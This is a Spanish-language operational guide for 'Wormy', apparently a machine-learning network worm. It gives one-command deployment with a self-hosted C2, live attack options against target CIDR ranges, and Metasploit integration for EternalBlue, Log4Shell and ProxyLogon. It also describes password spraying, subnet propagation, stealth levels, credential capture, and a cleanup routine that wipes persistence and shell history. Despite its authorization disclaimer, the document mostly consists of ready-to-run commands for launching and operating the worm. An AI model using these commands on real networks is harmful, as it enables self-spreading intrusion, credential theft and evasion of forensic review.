# Wormy v4.2 — Guía de Automatización Completa

> **⚠️ Solo para sistemas propios o con autorización escrita firmada.**

---

## Índice

1. [Concepto: el host como C2](#1-concepto-el-host-como-c2)
2. [Setup en un comando](#2-setup-en-un-comando)
3. [Flujo automatizado completo](#3-flujo-automatizado-completo)
4. [Opciones del script](#4-opciones-del-script)
5. [Ciclo de vida de un engagement](#5-ciclo-de-vida-de-un-engagement)
6. [Monitorización en tiempo real](#6-monitorización-en-tiempo-real)
7. [Post-engagement: limpieza y entrega](#7-post-engagement-limpieza-y-entrega)
8. [Integración con BloodHound](#8-integración-con-bloodhound)
9. [Automatización avanzada con Makefile](#9-automatización-avanzada-con-makefile)
10. [Referencia rápida de comandos](#10-referencia-rápida-de-comandos)

---

## 1. Concepto: el host como C2

En Wormy v3.0, la máquina desde la que lanzas el worm **también actúa como servidor C2**.
No necesitas infraestructura externa. El script `deploy_kali.sh` hace todo:

```
Tu máquina Kali
  ├── IP auto-detectada → C2 listener (puerto 8443)
  ├── config.yaml parcheado con tu IP
  ├── Worm lanzado → beacon a ti mismo
  └── Agentes comprometidos → reportan a tu IP
```

**Beneficios:**
- Sin VPS externo — todo en la red del engagement
- El C2 es accesible desde cualquier host comprometido en la misma red
- El tráfico C2 nunca sale de la red del cliente (stealth máximo)

---

## 2. Setup en un comando

```bash
# Clonar y desplegar en un solo pipeline
git clone https://github.com/Ruby570bocadito/Wormy-ML-Network-Worm
cd Wormy-ML-Network-Worm

# Preparar TODO (dry-run por defecto — seguro)
sudo ./scripts/deploy_kali.sh

# Cuando estés listo para atacar (con autorización):
sudo ./scripts/deploy_kali.sh --live --target 192.168.1.0/24
```

Lo que hace automáticamente en ~2 minutos:

| Paso | Acción |
|---|---|
| 1 | Detecta tu IP real (`ip route get 8.8.8.8`) |
| 2 | Instala paquetes de sistema (nmap, golang, libssl, freetds) |
| 3 | Instala Python: impacket, scapy, ldap3, pymssql, paramiko, bloodhound... |
| 4 | Lanza el C2 Python HTTPS integrado (el servidor C2 en Go de `stager/` era un skeleton no compilable y fue retirado del repo) |
| 5 | Parchea `configs/config.yaml` con tu IP como C2 |
| 6 | Valida que todos los módulos del worm importan correctamente |
| 7 | Pre-flight: verifica C2 health, DoH, ping al target |
| 8 | Configura el kill switch |
| 9 | Lanza el worm (solo con `--live`) |

---

## 3. Flujo automatizado completo

```
┌─────────────────────────────────────────────────────────────────────┐
│  Kali Machine (también C2)                                          │
│                                                                     │
│  sudo ./scripts/deploy_kali.sh --live --target 10.0.1.0/24         │
│         │                                                           │
│         ├─[Step 1-2]── Instala dependencias                        │
│         │                                                           │
│         ├─[Step 3]──── Levanta C2 en :8443                         │
│         │               └── curl http://localhost:8443/health → OK  │
│         │                                                           │
│         ├─[Step 4]──── Parchea config.yaml                         │
│         │               └── c2_server: "192.168.1.50"              │
│         │               └── target_range: "10.0.1.0/24"            │
│         │                                                           │
│         ├─[Step 5]──── Valida módulos (10/10 OK)                   │
│         │                                                           │
│         └─[Step 6]──── Lanza worm_core.py                          │
│                         │                                           │
│                         ├── EnterpriseScanner → mapea 10.0.1.0/24  │
│                         ├── RL Agent → prioriza targets por valor   │
│                         ├── PasswordEngine → spray multi-protocolo  │
│                         ├── Exploits → MySQL/Redis/MSSQL/AD...     │
│                         ├── AgentController → SSH pool por agente   │
│                         ├── WavePropagation → pivot a subredes      │
│                         └── ResilientC2 → beacon a localhost:8443   │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 4. Opciones del script

```bash
# Sintaxis
sudo ./scripts/deploy_kali.sh [opciones]

# Opciones disponibles
--live                  Lanza el worm después de preparar todo
                        (por defecto es dry-run — no ataca nada)

--target CIDR           Rango de IPs objetivo
                        Ejemplo: --target 192.168.10.0/24
                        (sin esta opción usa tu propia /24 como target)

--port PUERTO           Puerto del C2 (por defecto: 8443)
                        Ejemplo: --port 4443

--stealth NIVEL         Nivel de sigilo 1-3 (por defecto: 3)
                        1 = agresivo/rápido
                        3 = lento/sigiloso/máximo jitter

--with-msf              Inicia Metasploit RPC (msfrpcd)
                        Habilita: EternalBlue, Log4Shell, ProxyLogon
                        Requiere: Metasploit instalado (Kali lo trae)

--skip-packages         Salta la instalación de paquetes de sistema
                        Útil si ya tienes todo instalado

# Ejemplos de uso

# Preparación completa sin atacar (verificar que todo está OK)
sudo ./scripts/deploy_kali.sh

# Engagement real en red de cliente
sudo ./scripts/deploy_kali.sh \
  --live \
  --target 10.10.5.0/24 \
  --stealth 3 \
  --port 8443

# Con Metasploit para CVEs avanzados
sudo ./scripts/deploy_kali.sh \
  --live \
  --target 192.168.1.0/24 \
  --with-msf

# Puerto alternativo si 8443 está ocupado
sudo ./scripts/deploy_kali.sh \
  --live \
  --target 172.16.0.0/24 \
  --port 4444
```

---

## 5. Ciclo de vida de un engagement

### Fase 1 — Preparación (antes del día)
```bash
# 1. Clonar y verificar que todo compila
git clone https://github.com/Ruby570bocadito/Wormy-ML-Network-Worm
cd Wormy-ML-Network-Worm
sudo ./scripts/deploy_kali.sh   # dry-run — verifica todo

# 2. Configurar scope en configs/config.yaml
nano configs/config.yaml
# → c2_server, target_range, excluded_hosts, kill_switch_file

# 3. Verificar que el lab Docker funciona
docker compose -f docker-compose-lab.yml up -d
python3 -X utf8 tests/test_docker_lab.py
```

### Fase 2 — Lanzamiento
```bash
# Conectarte a la red del cliente (VPN o acceso físico)
# Luego:
sudo ./scripts/deploy_kali.sh \
  --live \
  --target <CIDR_AUTORIZADO> \
  --stealth 3
```

### Fase 3 — Monitorización
```bash
# Terminal 1: worm corriendo en background (ya lo hizo deploy_kali.sh)

# Terminal 2: dashboard en tiempo real
python3 monitoring/cli_monitor.py

# Terminal 3: ver beacons recibidos en el C2
watch -n 5 "curl -sk http://localhost:8443/agents | python3 -m json.tool"

# Terminal 4: logs en vivo
tail -f /tmp/wormy_run_*.log
```

### Fase 4 — Post-engagement
```bash
# 1. Kill switch (para inmediatamente)
touch STOP_WORMY_NOW

# 2. Limpiar todos los hosts comprometidos vía SSH
python3 scripts/cleanup_engagement.py \
  --agents-file data/agents.json

# 3. Exportar datos AD a BloodHound
python3 utils/bloodhound_export.py \
  --input data/ad_intel.json \
  --domain empresa.local \
  --out-dir /tmp/bloodhound_data/

# 4. Generar informe
python3 utils/audit_report.py

# 5. Limpiar máquina local
python3 scripts/cleanup_engagement.py --local-only
```

---

## 6. Monitorización en tiempo real

### Dashboard CLI (Rich)
```bash
python3 monitoring/cli_monitor.py
```
Muestra: hosts infectados, credenciales capturadas, beacons C2, propagation graph.

### Ver agentes registrados en el C2
```bash
# Ver todos los agentes que han hecho beacon
curl -sk http://TU_IP:8443/agents | python3 -m json.tool

# Respuesta ejemplo:
{
  "agent_abc123": {
    "last_seen": "2024-01-15T14:32:10",
    "data": {
      "ip": "10.0.1.25",
      "hostname": "FILESERVER",
      "pwned_count": 3,
      "os": "Windows Server 2019"
    }
  }
}
```

### Ver salud del C2
```bash
curl -sk http://TU_IP:8443/health
# {"status": "up", "agents": 7}
```

### Dashboard Web (si está activo)
- `http://localhost:5000` — Stats, hosts table, credentials
- `http://localhost:5001` — Mapa de red estilo Armitage

---

## 7. Post-engagement: limpieza y entrega

### Limpieza automática de todos los hosts comprometidos
```bash
# Crea agents.json con la lista de hosts comprometidos:
# {"ip": "10.0.1.25", "username": "root", "password": "toor"}

python3 scripts/cleanup_engagement.py \
  --agents-file /tmp/agents.json

# Solo limpiar la máquina local (sin SSH remoto)
python3 scripts/cleanup_engagement.py --local-only

# Ver qué haría sin hacer nada (dry-run)
python3 scripts/cleanup_engagement.py --dry-run
```

**Lo que elimina de cada host remoto via SSH:**
- Archivos del worm (`/tmp/.sysd`, `/tmp/wormy_*`)
- Persistencia systemd (`sys-helper.service`)
- Cron entries del worm
- Líneas añadidas en `authorized_keys`
- Entradas en `.bashrc` / `.profile`
- Historial de bash/zsh

**Lo que elimina localmente:**
- Todos los `.log` files
- SQLite command queues (`.db`)
- PIDs y procesos activos
- Archivos `/tmp/wormy_*`
- Historia de shell local
- Backup config.yaml restaurado

---

## 8. Integración con BloodHound

### Exportar datos AD del worm
```bash
# Si tienes intel de Active Directory recopilado:
python3 utils/bloodhound_export.py \
  --input data/ad_intel.json \
  --domain EMPRESA.LOCAL \
  --out-dir /tmp/bh_data/

# Demo (genera datos de ejemplo):
python3 utils/bloodhound_export.py --demo --domain EMPRESA.LOCAL
```

### Importar en BloodHound
```
1. Abrir BloodHound
2. Click "Upload Data"
3. Seleccionar todos los .json de /tmp/bh_data/
4. En la barra de búsqueda, ejecutar:
   - "Find All Domain Admins"
   - "Shortest Path to Domain Admin"
   - "Find Kerberoastable Users"
   - "Find AS-REP Roastable Users"
```

### Qué genera el exporter
```
/tmp/bh_data/
  20240115_143210_computers.json   # Hosts + DC + servicios + pwned flag
  20240115_143210_users.json       # Usuarios + kerberoastable + asrep flags
  20240115_143210_groups.json      # Domain Admins, IT Dept, HR...
```

---

## 9. Automatización avanzada con Makefile

Puedes crear un `Makefile` para shortcuts rápidos:

```makefile
# Makefile — poner en la raíz del proyecto

TARGET ?= 192.168.1.0/24
DOMAIN ?= EMPRESA.LOCAL

setup:
	sudo ./scripts/deploy_kali.sh

attack:
	sudo ./scripts/deploy_kali.sh --live --target $(TARGET)

attack-msf:
	sudo ./scripts/deploy_kali.sh --live --target $(TARGET) --with-msf

lab:
	docker compose -f docker-compose-lab.yml up -d
	sleep 30
	python3 -X utf8 tests/test_docker_lab.py

monitor:
	python3 monitoring/cli_monitor.py

bloodhound:
	python3 utils/bloodhound_export.py --domain $(DOMAIN) --demo

cleanup:
	python3 scripts/cleanup_engagement.py --local-only

cleanup-all:
	python3 scripts/cleanup_engagement.py

stop:
	touch STOP_WORMY_NOW

test:
	python3 -X utf8 tests/test_v2_modules.py
	python3 -X utf8 tests/comprehensive_test_suite.py

.PHONY: setup attack attack-msf lab monitor bloodhound cleanup cleanup-all stop test
```

```bash
# Uso:
make setup                           # preparar todo
make attack TARGET=10.0.1.0/24      # atacar
make lab                             # levantar lab y testear
make cleanup-all                     # limpiar todo post-engagement
make stop                            # kill switch
```

---

## 10. Referencia rápida de comandos

```bash
# ── SETUP ─────────────────────────────────────────────────────────────────
sudo ./scripts/deploy_kali.sh                     # preparar (dry-run)
sudo ./scripts/deploy_kali.sh --live              # preparar + atacar

# ── ATAQUE ────────────────────────────────────────────────────────────────
sudo ./scripts/deploy_kali.sh --live \
  --target 192.168.1.0/24 \
  --stealth 3 \
  --with-msf

# ── MONITORIZACIÓN ────────────────────────────────────────────────────────
python3 monitoring/cli_monitor.py                 # dashboard CLI
curl -sk http://localhost:8443/agents             # ver agentes
tail -f /tmp/wormy_run_*.log                      # logs en vivo

# ── TEST ──────────────────────────────────────────────────────────────────
python3 -X utf8 tests/test_v2_modules.py          # 30 tests unitarios
python3 -X utf8 tests/test_docker_lab.py          # test real Docker (8/11)
python3 -X utf8 tests/comprehensive_test_suite.py # 42/43 tests

# ── POST-ENGAGEMENT ───────────────────────────────────────────────────────
touch STOP_WORMY_NOW                              # kill switch inmediato
python3 scripts/cleanup_engagement.py --local-only
python3 scripts/cleanup_engagement.py --agents-file data/agents.json
python3 utils/bloodhound_export.py --input data/ad_intel.json
python3 utils/audit_report.py                     # generar informe
```
